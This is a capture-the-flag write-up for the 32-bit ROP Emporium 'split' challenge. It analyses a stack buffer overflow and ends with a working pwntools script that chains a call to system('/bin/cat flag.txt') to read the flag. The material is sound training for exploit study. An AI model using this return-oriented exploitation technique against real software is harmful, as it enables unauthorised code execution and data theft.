# split - 32 Bit
Program execution:
```
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> <input_here>
Thank you!
```
Run checksec: `checksec ./split32`
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Dissassembly shows that `main` executes `pwnme` again. We can see that `pwnme` unsafely reads up to `0x60` bytes into a 32 byte buffer starting at `ebp-0x28`:
```assembly
sub     esp, 0x4
push    0x60 {var_34}
lea     eax, [ebp-0x28 {var_2c}]
push    eax {var_2c} {var_38}
push    0x0
call    read
```
We have more than enough bytes to work with to overwrite the return address at `ebp+0x04`, so now we just need to work out what to jump to. There's no `win` function this time.

We can run `rabin2 -i split32` to view a list of imported functions:
```
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x080483b0 GLOBAL FUNC       read
2   0x080483c0 GLOBAL FUNC       printf
3   0x080483d0 GLOBAL FUNC       puts
4   0x080483e0 GLOBAL FUNC       system
5   0x00000000 WEAK   NOTYPE     __gmon_start__
6   0x080483f0 GLOBAL FUNC       __libc_start_main
7   0x08048400 GLOBAL FUNC       setvbuf
8   0x08048410 GLOBAL FUNC       memset
```
We have `system` from GLIBC so now it's a matter of finding a string which will give us a shell or open the flag file.

Use `rabin2 -z split32` to view a list of all user-added strings:
```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt
```
That last string is exactly what we want! So now we just need to build a rop chain that will execute `system('/bin/cat flag.txt')`

Exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./split32"

p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

cat_flag_addr = 0x0804a030

p.recvuntil(b'> ')

payload = b'A' * (0x28 + 0x4)
payload += p32(elf.symbols['system'])
payload += b'A' * 4 # dummy return address
payload += p32(cat_flag_addr) # argument string address

p.sendline(payload)

p.interactive()
```
And we get our flag:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```
